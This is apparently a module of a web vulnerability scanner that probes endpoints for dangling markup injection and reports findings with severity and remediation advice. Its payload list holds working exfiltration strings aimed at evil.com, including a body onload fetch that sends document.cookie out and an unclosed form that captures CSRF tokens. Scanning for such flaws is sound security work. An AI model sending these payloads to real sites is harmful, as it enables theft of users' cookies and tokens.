"""Dangling Markup Injection scanner — HTML injection without script execution, data exfiltration via form/attribute hijack."""
from __future__ import annotations
import asyncio
import random
import re
import string
from typing import Any
from talisman.utils.http_client import TalismanHTTPClient
from talisman.utils.logger import get_logger, console, print_finding

log = get_logger(__name__)

DANGLING_CANARY_PREFIX = "TLSMDANGLE"

DANGLING_ENDPOINTS = [
    "/search", "/api/search",
    "/api/profile", "/api/user",
    "/api/comment", "/api/post",
    "/api/message", "/api/feedback",
    "/api/contact", "/api/submit",
    "/login", "/register", "/signup",
    "/api/login", "/api/register",
    "/api/config", "/api/debug",
]

DANGLING_PAYLOADS = [
    # Classic dangling markup — captures content until next matching quote
    ('<img src="https://evil.com/steal?data=', "Img src dangling markup"),
    ('<form action="https://evil.com/steal"><input name="data" value="', "Form input value dangling markup"),
    ('<a href="https://evil.com/steal?data=', "Anchor href dangling markup"),
    ('<iframe src="https://evil.com/steal?data=', "Iframe src dangling markup"),
    ('<frame src="https://evil.com/steal?data=', "Frame src dangling markup"),
    ('<input type="hidden" name="csrf" value="', "Hidden input value dangling markup"),
    ('<meta http-equiv="refresh" content="0;url=https://evil.com/steal?data=', "Meta refresh dangling markup"),
    # CSS background URL capture
    ('<style>body{background:url("https://evil.com/steal?data=', "CSS background URL dangling markup"),
    # Link tag
    ('<link rel="stylesheet" href="https://evil.com/steal?data=', "Link href dangling markup"),
    # Script-less event handler
    ('<body onload="fetch(\'https://evil.com/steal?data=\'+document.cookie)">', "Body onload data exfil (no script tag)"),
]


async def _test_dangling_markup(
    url: str, endpoint: str, client: TalismanHTTPClient,
) -> list[dict[str, Any]]:
    """Test for dangling markup injection.

    The technique: inject an unclosed HTML tag attribute that captures
    subsequent page content until the next matching quote character.
    """
    findings: list[dict[str, Any]] = []
    test_url = url.rstrip("/") + endpoint
    canary = f"{DANGLING_CANARY_PREFIX}{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"

    for payload, description in DANGLING_PAYLOADS:
        # Add a unique canary so we can identify our injection
        test_payload = payload.replace("steal?data=", f"steal?data={canary}_")

        test_variants = [
            {"q": test_payload},
            {"search": test_payload},
            {"query": test_payload},
            {"name": test_payload},
            {"input": test_payload},
            {"comment": test_payload},
            {"message": test_payload},
            {"feedback": test_payload},
            {"data": test_payload},
            {"url": test_payload},
            {"redirect": test_payload},
            {"next": test_payload},
        ]

        for params in test_variants:
            try:
                r = await client.get(test_url, params=params, timeout=8)
                resp_text = r.text

                # Check 1: Is our payload reflected?
                if canary not in resp_text:
                    continue

                # Check 2: Did the injection capture content (dangling markup)?
                # Look for our canary followed by non-trivial content before a quote
                dangling_pattern = re.escape(f"{canary}_") + r"([^\"'>]+)"
                match = re.search(dangling_pattern, resp_text)
                if match:
                    captured = match.group(1)
                    # If we captured more than just our marker, dangling markup succeeded
                    param_name = list(params.keys())[0]

                    findings.append({
                        "type": "dangling_markup",
                        "endpoint": endpoint,
                        "payload_preview": payload[:60],
                        "description": description,
                        "canary": canary,
                        "param": param_name,
                        "evidence": f"Dangling markup capture: '...{canary}_{captured[:80]}...'",
                    })
                    break

            except Exception:
                pass

        if findings and any(f.get("canary") == canary for f in findings):
            break

    return findings


async def _test_dangling_form_hijack(
    url: str, endpoint: str, client: TalismanHTTPClient,
) -> list[dict[str, Any]]:
    """Test dangling markup via form hijacking — inject unclosed form tag that captures CSRF tokens."""
    findings: list[dict[str, Any]] = []
    test_url = url.rstrip("/") + endpoint
    canary = f"{DANGLING_CANARY_PREFIX}_FORM{''.join(random.choices(string.ascii_uppercase + string.digits, k=6))}"

    # Form hijacking payload: start a form that points to evil.com
    # and leave it unclosed to capture subsequent form fields
    form_payload = f'<form id="{canary}" action="https://evil.com/steal"><input type="hidden" name="csrf_token" value="'

    try:
        r = await client.get(test_url, params={"q": form_payload}, timeout=8)
        resp_text = r.text

        if canary in resp_text:
            # Check if the CSRF token (or any value) was captured between our
            # dangling value attribute and the next quote
            pattern = re.escape(canary) + r'.*?value="([^"<>]+)"'
            match = re.search(pattern, resp_text, re.DOTALL)
            if match:
                captured_value = match.group(1)
                findings.append({
                    "type": "form_hijack",
                    "endpoint": endpoint,
                    "canary": canary,
                    "evidence": f"Form hijack payload captured value: '{captured_value[:80]}'",
                })
    except Exception:
        pass

    return findings


async def run(
    target: str,
    session: Any = None,
    scope: Any = None,
    rate_limiter: Any = None,
    proxy: str | None = None,
    **kwargs: Any,
) -> dict[str, Any]:
    url = target if "://" in target else f"https://{target}"
    console.print(f"\n[module][+] Dangling Markup Injection Scanner[/module] -> [target]{url}[/target]")
    findings: list[dict[str, Any]] = []

    async with TalismanHTTPClient(proxy=proxy, timeout=12) as client:
        console.print(f"  Testing {len(DANGLING_ENDPOINTS)} endpoints for dangling markup...")

        for endpoint in DANGLING_ENDPOINTS:
            # -- 1. Standard dangling markup ------------------------------------------
            dm_findings = await _test_dangling_markup(url, endpoint, client)
            for f in dm_findings:
                ftype = f.get("type", "dangling_markup")
                title = f"Dangling markup injection at {endpoint}: {f.get('description', '')}"
                print_finding(title, "high", url)
                findings.append(f)
                if session:
                    await session.add_finding(
                        target=url, module="dangling_markup",
                        vuln_type=ftype,
                        severity="high", confidence="confirmed",
                        title=title,
                        description=f"Dangling markup injection confirmed at {endpoint}. Payload '{f.get('payload_preview', '')}' reflected and captured subsequent content, allowing exfiltration of page data including CSRF tokens and user content.",
                        evidence=f.get("evidence", ""),
                        remediation="1. HTML-encode all user-supplied data before rendering. 2. Specifically encode angle brackets (< >) and quotes (' \"). 3. Use Content-Type: text/plain for reflected data where possible. 4. Set X-Content-Type-Options: nosniff.",
                        cvss_score=7.5, cwe="CWE-79",
                    )

            # -- 2. Form hijacking (CSRF token capture) --------------------------------
            fh_findings = await _test_dangling_form_hijack(url, endpoint, client)
            for f in fh_findings:
                title = f"Dangling markup — form hijacking at {endpoint}: CSRF token capture possible"
                print_finding(title, "critical", url)
                findings.append(f)
                if session:
                    await session.add_finding(
                        target=url, module="dangling_markup",
                        vuln_type="form_hijack",
                        severity="critical", confidence="confirmed",
                        title=title,
                        description=f"Dangling markup form hijacking confirmed at {endpoint}. An unclosed form tag captured CSRF tokens or other sensitive page content, allowing attacker exfiltration.",
                        evidence=f.get("evidence", ""),
                        remediation="1. HTML-encode all reflected input. 2. Use CSP with form-action to restrict form submission targets. 3. Implement CSRF tokens that are bound to user sessions.",
                        cvss_score=9.1, cwe="CWE-79",
                    )

    console.print(f"  Dangling markup scan complete -- {len(findings)} issues")
    return {"target": url, "findings": findings, "count": len(findings)}
